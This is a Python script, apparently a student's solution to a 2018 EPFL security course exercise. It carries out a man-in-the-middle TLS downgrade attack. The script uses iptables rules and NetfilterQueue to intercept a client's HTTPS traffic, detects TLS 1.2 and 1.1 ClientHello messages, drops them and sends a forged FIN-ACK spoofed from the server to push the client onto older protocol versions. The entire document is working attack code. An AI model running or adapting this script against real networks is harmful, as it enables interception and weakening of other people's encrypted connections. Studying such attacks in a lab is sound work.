# Lucia Montero Sanchis
# Information Security and Privacy, EPFL 2018
import netfilterqueue
from netfilterqueue import NetfilterQueue
from scapy.all import *

# iptables -t nat -A POSTROUTING -j MASQUERADE
# iptables -A FORWARD -s 172.16.0.2 -p tcp --dport 443 -j NFQUEUE --queue-num 0
# iptables -A FORWARD -s 128.178.156.165 -p tcp --sport 443 -j NFQUEUE --queue-num 0

#Instead of forwarding the client hello, I create a new tcp packet with FN flag
#The idea behind it was that the server sends back a FIN-ACK packet and the clients
#thinks that it doesn't speak the respective TLS version

# NF_ACCEPT: let the packet pass
# NF_DROP: drop the packet
# NF_STOLEN: take the packet and don't let it pass
# NF_QUEUE: queue the packet
# NF_REPEAT: call the hook again

indices = [0, 5, 9, 10]
c_hello_v2 = [22, 1, 3, 3]
c_hello_v1 = [22, 1, 3, 2]

def callback(pkt):
    msg = IP(pkt.get_payload())
    #pkt.accept()
    if(msg.haslayer(TCP)):
        if len(msg[TCP].payload) > (2 + 4*11):
            info = [bytes(msg[TCP].payload)[i] for i in indices]
            if info == c_hello_v2:
                print(0)
                tot_len = int(msg.len - msg.ihl * 32 / 8 - msg[TCP].dataofs * 32 / 8)
                dport = msg[TCP].sport
                sport = 443
                seq = msg[TCP].ack
                ack = msg[TCP].seq + tot_len
                packet = (IP(dst="172.16.0.2", src="128.178.156.165") /
                    TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags=0x11))

                pkt.drop()
                send(packet)

            elif info == c_hello_v1:
                print(1)
                tot_len = int(msg.len - msg.ihl * 32 / 8 - msg[TCP].dataofs * 32 / 8)
                dport = msg[TCP].sport
                sport = 443
                seq = msg[TCP].ack
                ack = msg[TCP].seq + tot_len
                packet = (IP(dst="172.16.0.2", src="128.178.156.165") /
                    TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags=0x11))

                pkt.drop()
                send(packet)

            else:
                pkt.accept()
        else:
            pkt.accept()
    else:
        pkt.accept()

nfqueue = NetfilterQueue()

# To not overload the queue, specifying queue length
nfqueue.bind(0, callback, 100)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')
nfqueue.unbind()